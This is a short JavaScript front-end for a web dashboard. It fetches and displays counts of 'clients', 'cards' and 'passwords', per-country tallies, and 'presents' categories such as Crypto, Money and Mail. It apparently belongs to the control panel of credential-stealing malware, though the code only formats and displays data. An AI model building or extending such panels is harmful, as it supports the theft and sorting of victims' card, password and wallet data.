(function () {
	'use strict'

	feather.replace()
}())
$.ajax({
	url: "/ajax/load.full_info",
	type: "POST",
	json: true,
	success: function (data) {
		if (data.status) {
			$("#info-clients").text(data.info.clients)
			$("#info-cards").text(data.info.cards)
			$("#info-passwords").text(data.info.passwords)

			for (var i in data.countrys) {
				$("#info-country-list").append('<span class="badge badge-info">' + data.countrys[i].country + ': ' + data.countrys[i].count + '</span> ')
			}

			$("#info-checked").text(data.clientStatus.checked);
			$("#info-unchecked").text(data.clientStatus.unchecked);
			$("#info-empty").text(data.clientStatus.empty);
		}
	}
})


function utToDate(timestamp) {
	var months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];

	var time = new Date(timestamp ? timestamp * 1000 : null);

	var hours = (time.getHours()) < 10 ? "0" + time.getHours() : time.getHours();
	var minutes = (time.getMinutes()) < 10 ? "0" + time.getMinutes() : time.getMinutes();

	return time.getDate() + " " + months[time.getMonth()] + " " + hours + ":" + minutes;
}

function getPresentsCategory(id) {
	switch (parseInt(id)) {
		case 1:
			return "💎 | Crypto";
		case 2:
			return "🎰 | Money";
		case 3:
			return "🎮 | Game";
		case 4:
			return "🎓 | Forum";
		case 5:
			return "💌 | Mail";
		case 6:
			return "🎉 | Social";
		case 7:
			return "🐔 | Custom";
		default:
			return "Error";
	}
}
var EmojiPresents = {
	1: "💎",
	2: "🎰",
	3: "🎮",
	4: "🎓",
	5: "💌",
	6: "🎉",
	7: "🐔",
}
